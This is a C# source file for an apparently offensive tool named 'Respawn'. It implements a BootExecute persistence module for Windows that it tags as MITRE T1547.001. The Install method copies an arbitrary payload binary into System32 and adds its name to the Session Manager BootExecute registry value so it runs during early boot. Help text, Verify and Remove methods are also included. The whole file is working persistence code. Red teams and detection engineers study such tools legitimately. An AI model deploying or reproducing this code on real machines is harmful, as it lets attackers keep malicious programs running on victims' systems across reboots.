using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.IO;

namespace Respawn.Techniques.BootExecute
{
    public class BootExecuteModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "boot";
        public string Name        => "BootExecute Persistence";
        public string Mitre       => "T1547.001";
        public string Description => "Abuse the Session Manager (smss.exe) by modifying the BootExecute registry value. This allows a Native application to execute during the early boot phase before standard subsystem services are initialized.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SYSTEM\CurrentControlSet\Control\Session Manager";
        const string ValueName = "BootExecute";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Name of the binary in System32 (e.g. 'BootExe')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to source Native application binary");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t boot -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t boot -a install -n \"BootExe\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t boot -a verify  -n \"BootExe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t boot -a remove  -n \"BootExe\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return BootExecuteKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Session Manager registry key. Run as administrator.");

                // Resolved CS8600: Using 'as' and null check
                string[]? currentValues = baseKey.GetValue(ValueName) as string[];
                if (currentValues == null)
                    return TechniqueResult.Fail("Could not read BootExecute value or value is not a multi-string.");

                if (currentValues.Any(v => v.Contains(ctx.Name, StringComparison.OrdinalIgnoreCase)))
                    return TechniqueResult.Exists($"Entry '{ctx.Name}' already exists in BootExecute.");

                // 1. Copy payload to System32
                string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, ctx.Name + ".exe");
                
                File.Copy(ctx.Payload, targetPath, true);

                // 2. Append to the Multi-String array
                List<string> newValues = currentValues.ToList();
                newValues.Add(ctx.Name); 

                baseKey.SetValue(ValueName, newValues.ToArray(), RegistryValueKind.MultiString);

                return TechniqueResult.Ok(
                    $"Installed '{ctx.Name}' to BootExecute and copied to System32. " +
                    "Binary will execute during early boot phase.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. BootExecute requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied. Run as administrator.");

                // Resolved CS8600: Nullability handling
                string[]? currentValues = baseKey.GetValue(ValueName) as string[];
                if (currentValues == null || !currentValues.Any(v => v.Contains(ctx.Name, StringComparison.OrdinalIgnoreCase)))
                    return TechniqueResult.NotFound($"Entry '{ctx.Name}' not found in BootExecute.");

                // 1. Remove from registry array
                string[] newValues = currentValues.Where(v => !v.Contains(ctx.Name, StringComparison.OrdinalIgnoreCase)).ToArray();
                baseKey.SetValue(ValueName, newValues, RegistryValueKind.MultiString);

                // 2. Attempt to delete from System32
                try {
                    string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ctx.Name + ".exe");
                    if (File.Exists(targetPath)) File.Delete(targetPath);
                } catch { /* Ignore file lock errors */ }

                return TechniqueResult.Ok($"Removed '{ctx.Name}' from BootExecute.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null) return TechniqueResult.Fail("Registry key access error.");

                // Resolved CS8600, CS8602: Safe casting and null checks
                string[]? currentValues = baseKey.GetValue(ValueName) as string[];

                bool inRegistry = currentValues?.Any(v => v.Contains(ctx.Name, StringComparison.OrdinalIgnoreCase)) ?? false;
                string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ctx.Name + ".exe");
                bool fileExists = File.Exists(targetPath);

                if (!inRegistry)
                    return TechniqueResult.NotFound($"Entry '{ctx.Name}' is missing from BootExecute.");

                return TechniqueResult.Ok($"Verified BootExecute entry '{ctx.Name}'. File in System32: {fileExists}");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No entry name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}